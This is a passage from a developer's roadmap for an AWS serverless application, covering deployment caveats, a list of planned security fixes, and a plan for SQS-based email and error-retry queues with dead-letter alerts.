- Stream handler metrics and monitoring (operational blindness)

### 📝 What's Not Great (Can work, but needs improvement):
- Error handling inconsistent
- Logging not structured
- Code duplication
- No tests
- No documentation
- No monitoring

---

## 🚀 Recommended Deployment Strategy

### Initial Launch (MVP - Current State)
**Can deploy NOW with these caveats:**
1. ⚠️ Limited to trusted users only (no public access yet)
2. ⚠️ Manual monitoring required
3. ⚠️ Have rollback plan ready
4. ⚠️ Daily backups of DynamoDB
5. ⚠️ Email failures won't retry automatically (direct SES)
6. ⚠️ DB stream errors are logged but not retried

**Current Email Setup:**
- Emails sent directly via SES (synchronous)
- No retry mechanism if SES throttles
- Cognito sends its own emails (not customized)
- Failed emails = lost emails

### Before Public Launch
**Complete Phase 3 (Critical Security) + Phase 7 (Infrastructure):**

**Phase 3 - Security:**
1. Add HTML sanitization
2. Implement rate limiting
3. Add IDOR protection
4. Fix mass assignment
5. Remove password from email

**Phase 7 - Infrastructure (HIGHLY RECOMMENDED):**
1. Set up email SQS queue + DLQ
2. Create mailer Lambda function
3. Attach custom message trigger to Cognito
4. Set up error handling queue + DLQ
5. Update DB stream handler for error queueing
6. Configure admin notifications for DLQ

**Why Phase 7 is Critical:**
- 📧 Emails will retry automatically on failure
- 🔄 DB stream errors will retry instead of being lost
- 📊 Visibility into email and error metrics
- 🚨 Admin alerts when things break
- 💪 Production-grade reliability

### Production-Ready (Fully Robust)
**Complete Phase 3 + Phase 7 + Monitoring:**
1. All Phase 3 security fixes ✅
2. All Phase 7 infrastructure ✅
3. CloudWatch dashboards
4. DLQ monitoring
5. Cost alerts
6. Basic documentation
7. Load testing completed

**Email Flow (After Phase 7):**
```
User Action → Queue Email to SQS → Mailer Lambda → SES → User Inbox
                    ↓ (on failure)
              Retry (3x) → DLQ → Admin Alert
```

**Error Flow (After Phase 7):**
```
DB Stream Error → Queue to SQS → Retry Lambda → Operation Retry
                       ↓ (on failure)
                 Retry (5x) → DLQ → Admin Alert
```

---

## 📞 Quick Reference

### If Something Breaks:
1. Check CloudWatch Logs for the Lambda function
2. Search for error message in logs
3. Check DynamoDB table for data issues
4. Verify Cognito user pool settings
5. Check API Gateway CORS configuration

### Common Issues:
- **"User already exists"**: Check both DynamoDB and Cognito
- **"Token expired"**: User needs to sign in again
- **"Origin not allowed"**: Add origin to CORS whitelist
- **"File too large"**: Limit is 10MB, enforce on frontend too
- **"Invalid file type"**: Only jpeg, png, gif, webp allowed

---

## 🎓 Notes for Future

**Email Infrastructure Strategy:**
- **Current:** Direct SES calls (synchronous, no retry)
- **Phase 7 Goal:** SQS-based queueing with retry and DLQ
- **Benefits:**
  - Decoupled email sending from API responses
  - Automatic retries on SES throttling
  - Better visibility and monitoring
  - Admin alerts on persistent failures
  - Customized Cognito emails (welcome, verification, password reset)
- **Migration Path:**
  1. Create email queue + DLQ
  2. Create mailer Lambda (consumes queue)
  3. Add `queueEmail()` function to layer
  4. Update controllers to queue instead of direct send
  5. Create Cognito custom message trigger
  6. Test thoroughly before switching

**Error Handling Strategy:**
- **Current:** DB stream errors are logged but lost
- **Phase 7 Goal:** Queue failed operations for retry
- **Coverage:**
  - OpenSearch indexing failures
  - WebSocket notification failures
  - Aggregation calculation failures
- **Retry Logic:**
  - Max 5 retries with exponential backoff
  - DLQ after max retries
  - Admin notification on DLQ messages

**Redis Strategy:**
- When enabled, use for:
  - Config caching (already in code, just commented)
  - Session caching (faster than DynamoDB queries)
  - Rate limiting counters
  - Frequently accessed data

**Testing Strategy:**
- Start with critical path: auth flow
- Then test CRUD operations
- Then edge cases
- Aim for 70% coverage minimum
- **Phase 7 Testing:**
  - Email queue end-to-end flow
  - Error queue retry mechanism
  - DLQ admin notifications
  - SQS batch processing

**Documentation Priority:**
1. API documentation (for frontend team)
2. Setup guide (for new developers)
3. Deployment guide (for DevOps)
4. Module READMEs (for maintainability)
5. **Phase 7:** Infrastructure architecture diagrams (queues, lambdas, DLQs)

---

## 📦 New Infrastructure Components (Phase 7)

When you implement Phase 7, you'll create these new modules:

### 1. `cosmediate-mailer` Lambda
**Purpose:** Process email queue and send emails via SES  
**Trigger:** SQS (email queue)  
**Files:**
```
modules/cosmediate-mailer/
├── index.mjs              # Main handler
├── lib/
│   ├── processor.mjs      # Email processing logic
│   └── templates.mjs      # Template selector
└── package.json
```

### 2. `cosmediate-cognito-custom-message` Lambda
**Purpose:** Intercept Cognito emails and queue them  
**Trigger:** Cognito Custom Message trigger  
**Files:**
```
modules/cosmediate-cognito-custom-message/
├── index.mjs              # Main handler
└── package.json
```

### 3. `cosmediate-error-retry-handler` Lambda
**Purpose:** Retry failed DB stream operations  
**Trigger:** SQS (error queue)  
**Files:**
```
modules/cosmediate-error-retry-handler/
├── index.mjs              # Main handler
├── lib/
│   ├── retryHandlers.mjs  # Operation-specific retry logic
│   └── utils.mjs          # Helper functions
└── package.json
```

### AWS Resources to Create:
- **SQS Queues:**
  - `cosmediate-emails-queue-dev/prod`
  - `cosmediate-emails-dlq-dev/prod`
  - `cosmediate-errors-queue-dev/prod`
  - `cosmediate-errors-dlq-dev/prod`
- **SNS Topics:**
  - `cosmediate-dlq-alerts-dev/prod`
- **CloudWatch Alarms:**
  - Email DLQ message count
  - Error DLQ message count
  - Queue depth warnings
  - Message age warnings

---

**This is a living document. Update as you complete tasks!**

Last Updated: November 10, 2025 (Added DB Stream Handler fixes + Phase 7 TODO improvements)  
Next Review: After Phase 3 completion or before production deployment

